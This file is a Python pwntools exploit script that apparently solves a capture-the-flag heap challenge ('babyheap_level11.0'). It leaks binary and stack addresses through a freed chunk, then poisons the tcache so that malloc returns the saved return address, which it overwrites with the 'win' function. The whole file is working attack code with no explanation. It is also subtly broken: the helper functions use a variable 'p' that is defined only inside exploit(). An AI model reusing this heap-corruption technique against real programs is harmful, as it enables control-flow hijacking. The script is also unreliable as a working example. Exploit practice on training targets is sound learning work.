#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn

BINARY = "/challenge/babyheap_level11.0"

exe = pwn.context.binary = pwn.ELF(BINARY)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8  = pwn.p8
u8  = pwn.u8

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(pwn.args.HOST or '127.0.0.1', int(pwn.args.PORT or 1337))
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

def malloc_to_1(loc:bytes):
    '''Prepare heap to overwrite with a specific location'''
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'200')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'200')
    p.sendline(b'free')
    p.sendline(b'0')
    p.sendline(b'free')
    p.sendline(b'1')

    p.sendline(b'scanf')
    p.sendline(b'1')
    p.recv()
    p.sendline(loc)
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'200')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'200')

def scanf_to_pos(buf:bytes, pos:bytes):
    '''Write to a position in the heap'''
    p.sendline(b'scanf')
    p.sendline(pos)
    p.sendline(buf)
    p.recv()

def exploit():
    #--------Setup--------#
    p = start()
    
    # Setup for heap overflow
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'100')
    p.sendline(b'free')
    p.sendline(b'0')

    # Leak binary address
    p.sendline(b'echo')
    p.sendline(b'0')
    p.sendline(b'112')
    p.recvuntil(b'Data: ')
    bin_echo = p.recvuntil(b'\n')[:-1]
    binary_base = u64(bin_echo) - exe.sym['bin_echo']
    exe.address = binary_base
    print(p64(exe.address))

    # Leak stack address
    p.sendline(b'echo')
    p.sendline(b'0')
    p.sendline(b'120')
    p.recvuntil(b'Data: ')
    stack_leak = p.recvuntil(b'\n')[:-1]
    ret_addr = u64(stack_leak) + 374
    print(p64(ret_addr))

    # Execute exploit
    malloc_to_1(p64(ret_addr))
    scanf_to_pos(p64(exe.sym.win), b'1')
    p.sendline(b'quit')

    p.interactive()

if __name__ == "__main__":
    exploit()
